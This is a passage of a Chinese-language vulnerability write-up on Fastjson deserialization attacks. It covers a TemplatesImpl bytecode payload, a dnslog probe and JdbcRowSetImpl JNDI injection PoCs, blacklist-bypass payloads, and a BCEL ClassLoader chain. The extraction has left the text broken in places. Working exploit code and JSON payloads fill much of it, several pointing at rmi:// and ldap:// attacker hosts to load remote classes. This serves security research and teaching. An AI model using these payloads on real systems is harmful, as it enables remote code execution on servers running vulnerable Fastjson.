WU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAA
AAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASA
A0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIAC
wAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAA
QARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABA
BMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAA
gALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAA
AACACQ=\"]," +
                "'_name':'a.b'," +
                "'_tfactory':{ }," +
关于 set 方法和 get 方法的搜索与建立集合
此处涉及到一个疑问，就是调试的过程中会建立一个 sortedFieldDeserializers ，之后会出现
将属性和这个数组进行比较的逻辑，之后调试发现这个是用来存储特殊的 set 和 get 方法的。 
经过这个 JavaBeanInfo.Build 方法，会将特殊的 get 和 set 方法挑出来，并且建立数组，之后
会用到。
获取 beanInfo.fields 数组的具体方法 
通过 getProperties() 执行 newTransform 方法。
                "'_outputProperties':{ }}";
        Object obj = JSON.parseObject(text, Object.class, parserConfig, 
Feature.SupportNonPublicField);
        //TemplatesImpl
        //com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
    }
}
这个也是重要的触发构造链的地方。
类型判断是数组对象
解析数组对象
dnslog 构造链
说明
这个构造链较为简单，可以通过这个方法判断漏洞是否存在。通过 dnslog 平台就可以知道是否存
在漏洞了。
触发请求
package fastjson.example.use;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
public class unserialize2 {
    public static void main(String[] args) {
        ParserConfig parserConfig = new ParserConfig();
        //String s3="
{\"@type\":\"fastjson.example.use.User\",\"age\":25,\"name\":\"zhangsan\"}";
        String s4="
{\"@type\":\"java.net.Inet4Address\",\"val\":\"1zfg9k.dnslog.cn\"}";
        Object o = JSON.parseObject(s4, Object.class,parserConfig, 
Feature.SupportNonPublicField);
        if(o instanceof User){
            User user3=(User) o;
            int age1 = user3.getAge();
            System.out.println(age1);
        }
        //java.net.Inet4Address
    }
}
com.sun.rowset.JdbcRowSetImpl 链
在上述的链中因为 TemplatesImpl 链需要开启私有属性的反序列化，利用条件比较困难，所以需
要寻找新的构造链，此处利用到了 com.sun.rowset.JdbcRowSetImpl ，这个构造链本质就是利
用 com.sun.rowset.JdbcRowSetImpl 进行 JNDI 注入
poc 代码
根据 fastjson 反序列化的条件，关注 dataSourceName 和 autoCommit 两个参数，首先是
dataSourceName 参数，通过反序列化的时候设置这个 dataSourceName 参数 
再是 autoCommit 参数。这里会调用 this.conn.setAutoCommit 方法去进行一个请求。另外根据
JdbcRowSetImpl 的初始化， this.conn 为空，所以会调用 this.connect 方法 
package fastjson.example.bug;
import com.alibaba.fastjson.JSON;
public class payload2_ {
    public static void main(String[] args) {
        //java 8u121的trustURLCodebase默认关闭    
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        String payload = "
{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhos
t:1093/evil\"," +
                " \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
this.connect 方法 
在第323行判断是否存在 dataSourceName ，然后利用这个 dataSourceName 作为请求源去进行
JNDI 访问，在此处产生了 JNDI 注入。
对修复方案的绕过
fastjson 最基础的反序列化原理便是上面的分析。在版本 1.2.25 之后，将 autoTypeSupport
设置为 false ，并且添加了 checkAutoType() 函数进行黑名单校验，因此之后的漏洞均是针对黑
名单的绕过。
fastjson=1.2.25 默认为 false ）
2.8 fastjson<=1.2.66 漏洞详情
基于ClassLoader的POC
{
    "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName":"rmi://x.x.x.x:9999/rce_1_2_24_exploit",
    "autoCommit":true
}
{
    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName":"rmi://x.x.x.x:9999/exp",
    "autoCommit":true
}
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":
{"data_source":"ldap://localhost:1389/Exploit"}}
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://x.x.x.x
:9999/exploit"}";
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.16
8.80.1:1389/Calc"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.16
8.80.1:1389/Calc"}
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap:
//192.168.80.1:1389/Calc"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","proper
ties": {"@type":"java.util.Properties","UserTransacti
on":"ldap://192.168.80.1:1389/Calc"}}
首先看一下 com.sun.org.apache.bcel.internal.util.ClassLoader 这个类加载器的加载机
制， java 、 javax 和 sun 这三个包下的类会通过系统类加载器进行加载，然后当遇到一些特殊的
类名， class_name以$$BCEL$$ 开头的类，会调用 createClass 方法去解析 class_name ，在
createClass 方法中会将 $$BCEL$$ 之后的字符解码成字节数组，并将这个BCEL编码后的类加载
到虚拟机中。换言之，我们可以构造 className 为一个特殊的字符串时，通过这个类加载器来实
现对自定义类的加载。参考文章：BCEL ClassLoader去哪了  对于整个 BCEL 表达式自定义了编码
和解码的方式，所以不需要自己写编码解码方法。
{
    {
        "aaa": {
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "bbb"
}
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import java.io.IOException;
public class bcelImpl {
    public static void main(String[] args) throws IOException, 
CannotCompileException, NotFoundException, InstantiationException, 
IllegalAccessException, ClassNotFoundException {
        ClassPool aDefault = ClassPool.getDefault();
        CtClass ctClass = aDefault.get(eval.class.getName());
        String encode = Utility.encode(ctClass.toBytecode(),true);
        System.out.println(encode);
        ClassLoader classLoader = new ClassLoader();
        classLoader.loadClass("$$BCEL$$"+encode).newInstance();
    }
}